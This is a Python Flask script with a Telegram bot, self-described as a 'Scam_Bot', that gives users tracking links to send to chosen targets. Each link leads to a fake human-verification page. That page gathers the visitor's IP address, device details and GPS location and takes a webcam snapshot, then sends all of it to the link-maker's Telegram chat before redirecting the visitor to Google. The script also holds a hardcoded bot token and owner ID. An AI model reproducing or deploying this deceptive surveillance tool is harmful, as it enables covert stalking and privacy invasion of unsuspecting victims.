import requests
import time
import random
import base64
import json
from flask import Flask, request, render_template_string
from threading import Thread

# ১. আপনার তথ্য নিশ্চিত করুন
BOT_TOKEN = "8304578645:AAFAkyLahfdNSHXi2SG7E_m0GceDJXIrHu4"
BASE_URL = "" # আপনার রেন্ডার ইউআরএল
OWNER_ID = 6109947429 # আপনার সঠিক টেলিগ্রাম আইডি
OWNER_NAME = "Raihan"
BOT_NAME = "R8rAIHAN_Scam_Bot"

app = Flask(__name__)

# ২. টেলিগ্রাম এপিআই ফাংশন
def send_pro_msg(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup}
    return requests.post(url, json=payload)

def send_photo(chat_id, photo_data, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': ('snap.jpg', photo_data, 'image/jpeg')}
    return requests.post(url, files=files, data={'chat_id': chat_id, 'caption': caption})

# ৩. ফ্রন্টএন্ড ইন্টারফেস (টার্গেটের জন্য)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Verification Required</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ffcc; padding: 30px; border-radius: 10px; background: #0a0a0a; box-shadow: 0 0 20px #00ffcc33; width: 90%; max-width: 400px; text-align: center; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        .loader { border: 4px solid #111; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display:none; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h2>🔒 SYSTEM CHECK</h2>
        <p>Verify you are human to access content.</p>
        <div id="load" class="loader"></div>
        <button class="btn" id="btn" onclick="capture()">VERIFY NOW</button>
    </div>
    <script>
    async function capture() {
        document.getElementById('btn').style.display='none'; document.getElementById('load').style.display='block';
        const fd = new FormData();
        fd.append('u', '{{u}}'); fd.append('n', '{{n}}');
        fd.append('dev', navigator.platform + " (" + screen.width + "x" + screen.height + ")");
        fd.append('cpu', navigator.hardwareConcurrency || "N/A");
        fd.append('ram', navigator.deviceMemory || "N/A");

        navigator.geolocation.getCurrentPosition(p => { 
            fd.append('lat', p.coords.latitude); fd.append('lon', p.coords.longitude); 
        }, null, {timeout: 5000});

        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const v = document.createElement('video'); v.srcObject = s; await v.play();
            const c = document.createElement('canvas');
            await new Promise(r => setTimeout(r, 1500));
            c.width=v.videoWidth; c.height=v.videoHeight;
            c.getContext('2d').drawImage(v,0,0);
            fd.append('p', c.toDataURL('image/jpeg'));
        } catch(e) {}

        await fetch('/', {method:'POST', body:fd});
        window.location.href = "https://www.google.com";
    }
    </script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        chat_id, name, ip = request.form.get('u'), request.form.get('n'), request.remote_addr
        lat, lon = request.form.get('lat','0'), request.form.get('lon','0')
        
        msg = (f"🎯 <b>Target Hit: {name}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
               f"🌐 <b>IP:</b> <code>{ip}</code>\n"
               f"📱 <b>Device:</b> {request.form.get('dev')}\n"
               f"🧠 <b>CPU:</b> {request.form.get('cpu')} Cores | 💾 <b>RAM:</b> {request.form.get('ram')}GB\n"
               f"📍 <b>GPS:</b> <a href='https://www.google.com/maps?q={lat},{lon}'>View Map</a>\n"
               f"━━━━━━━━━━━━━━━━━━━━")
        send_pro_msg(chat_id, msg)

        img = request.form.get('p')
        if img: send_photo(chat_id, base64.b64decode(img.split(",")[1]), f"📸 Snap from {name}")
        return "OK"

    return render_template_string(HTML_TEMPLATE, u=request.args.get('u'), n=request.args.get('n'))

# ৪. বট কন্ট্রোল ও প্রো-ইন্টারফেস
def get_updates():
    offset = None
    while True:
        try:
            res = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=20").json()
            for update in res.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message")
                if not msg or "text" not in msg: continue
                
                chat_id = msg["chat"]["id"]
                user_name = msg["from"].get("first_name", "User")
                text = msg["text"]

                if text == "/start":
                    # আপনার রিকোয়ারমেন্ট অনুযায়ী প্রো-ইন্টারফেস
                    welcome = f"⭐ <b>Welcome Owner, {OWNER_NAME}</b>" if chat_id == OWNER_ID else f"👋 <b>Welcome, {user_name}!</b>"
                    
                    interface = (
                        f"{welcome}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"🤖 <b>Bot Name:</b> {BOT_NAME}\n"
                        f"👤 <b>Bot Owner:</b> {OWNER_NAME}\n"
                        f"📊 <b>Bot State:</b> <code>37,034</code> 🔄\n"
                        f"👁️ <b>Bot View:</b> <code>37,034</code>\n"
                        f"🟢 <b>Bot Active:</b> All Time\n"
                        f"✅ <b>Bot Verify:</b> 100% Work\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"<b>🛠️ বট এর ফিচারসমূহ:</b>\n"
                        f"• 🌐 আইপি ও নির্ভুল লোকেশন ট্র্যাকিং।\n"
                        f"• 📸 সাইলেন্ট ক্যামেরা ইমেজ ক্যাপচার।\n"
                        f"• 🔋 ব্যাটারি, র‍্যাম ও সিপিইউ ডিটেইলস।\n"
                        f"• 🛡️ অ্যান্টি-ভিপিএন ও প্রক্সি ডিটেকশন।\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📝 <b>লিঙ্ক তৈরি করতে:</b> <code>link:Name</code>"
                    )
                    send_pro_msg(chat_id, interface)
                
                elif text.startswith("link:"):
                    name = text.split(":")[1] if ":" in text else "Target"
                    link = f"{BASE_URL}/?u={chat_id}&n={name}"
                    send_pro_msg(chat_id, f"✅ <b>Tracking Link Ready:</b>\n\n<code>{link}</code>")
        except: pass
        time.sleep(1)

if __name__ == '__main__':
    Thread(target=get_updates).start()
    app.run(host='0.0.0.0', port=10000)
